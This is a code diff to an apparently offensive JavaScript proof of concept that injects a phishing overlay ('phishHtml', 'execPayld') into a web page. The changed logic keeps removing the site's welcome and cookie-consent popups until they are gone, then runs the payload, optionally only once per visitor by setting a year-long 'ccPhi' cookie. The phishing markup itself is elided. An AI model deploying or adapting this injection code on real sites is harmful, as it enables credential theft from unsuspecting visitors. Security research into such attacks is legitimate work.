@@ -1,7 +1,3 @@
-window.onload = function() {
-  document.getElementsByClassName('cdk-overlay-container')[0].remove();
-  document.getElementsByTagName('div')[0].remove();
-};
 let runOnce = false;
 const phishHtml = `
 <style>
@@ -148,16 +144,38 @@ function execPayld() {
   },
   1000);
 }
-// [CASE] RUN (PAYLOAD) ONCE ENABLED AND COOKIE NOT SET => SET RUNONCE COOKIE AND EXECUTE PAYLOAD
-if ((runOnce) && !(/^(.*;)?\s*ccPhi\s*=\s*[^;]/.test(document.cookie))) {
-  let cookExp = new Date();
-  cookExp.setFullYear(cookExp.getFullYear() + 1);
-  let cook = 'ccPhi=true; path=/; expires=' + cookExp.toUTCString();
-  document.cookie = cook;
-  execPayld();
+function checkDOM() {
+  var popupElements1 = document.getElementsByClassName('cdk-overlay-container');
+  var popupElements2 = document.getElementsByTagName('div');
+  if (popupElements1.length > 0) {
+    console.log('[*] Removing popup DOM element #1 (welcome)');
+    popupElements1[0].remove();
+  }
+  if (popupElements2[0].getAttribute('aria-label') == 'cookieconsent') {
+    console.log('[*] Removing popup DOM element #2 (cookie consent)');
+    popupElements2[0].remove();
+  }
+  if ((popupElements1[0] != undefined) || (popupElements2[0].getAttribute('aria-label') != null)) {
+    console.log('[*] DOM popups NOT deleted');
+    setTimeout(() => { checkDOM(); }, 100);
+  } else {
+    console.log('[*] DOM popups deleted');
+    startPoC();
+  }
 }
-// [CASE] RUN (PAYLOAD) ONCE NOT ENABLED => EXECUTE PAYLOAD
-if (!runOnce) {
-  execPayld();
+checkDOM();
+function startPoC() {
+  // [CASE] RUN (PAYLOAD) ONCE ENABLED AND COOKIE NOT SET => SET RUNONCE COOKIE AND EXECUTE PAYLOAD
+  if ((runOnce) && !(/^(.*;)?\s*ccPhi\s*=\s*[^;]/.test(document.cookie))) {
+    let cookExp = new Date();
+    cookExp.setFullYear(cookExp.getFullYear() + 1);
+    let cook = 'ccPhi=true; path=/; expires=' + cookExp.toUTCString();
+    document.cookie = cook;
+    execPayld();
+  }
+  // [CASE] RUN (PAYLOAD) ONCE NOT ENABLED => EXECUTE PAYLOAD
+  if (!runOnce) {
+    execPayld();
+  }
 }
 // EoF
